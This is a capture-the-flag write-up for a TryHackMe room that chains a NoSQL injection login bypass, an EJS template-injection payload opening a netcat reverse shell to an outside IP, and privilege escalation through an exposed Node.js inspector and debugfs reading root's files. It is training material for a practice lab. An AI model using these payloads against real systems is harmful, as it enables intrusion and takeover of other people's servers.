# Day 7 - Do Not Disturb
## Room: <https://tryhackme.com/room/hh-donotdisturb-84a45644>

Hello Hackers!

Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups.

A login page is available, so we first inspect the login request using Burp Suite.

The application is vulnerable to NoSQL injection. In Burp, change the request parameters to:

```text
username=attendant&password[$ne]=null
```

This bypasses the password check and logs us into the application.

The application contains an EJS field that processes server-side JavaScript. We can use it to execute commands and obtain a reverse shell.

The attached payload is:

```ejs
<%= process.mainModule.require('child_process').execSync('rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 192.168.188.174 4444 1>/tmp/b') %>
```

After running the payload and receiving the shell, the user flag can be retrieved:

> `THM{...}`

Next, we perform privilege-escalation enumeration using LinPEAS:

```bash
./linpeas.sh
```

LinPEAS reveals interesting disk access permissions and a Node.js process listening on port `9229`.

We connect to the Node.js inspector:

```bash
node inspect 127.0.0.1:9229
```

Enter the REPL:

```text
repl
```

Now use the Node.js process to execute the `lsblk` command:

```javascript
process.getBuiltinModule('child_process').execSync('lsblk').toString()
```

The output reveals the disk device:

> `/dev/nvme0n1p1`

Since we have raw disk access, we can use `debugfs` to read the root flag directly from the filesystem:

```bash
process.getBuiltinModule('child_process').execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1').toString()
```

This reveals the root flag:

> `THM{...}`

Happy Hacking!
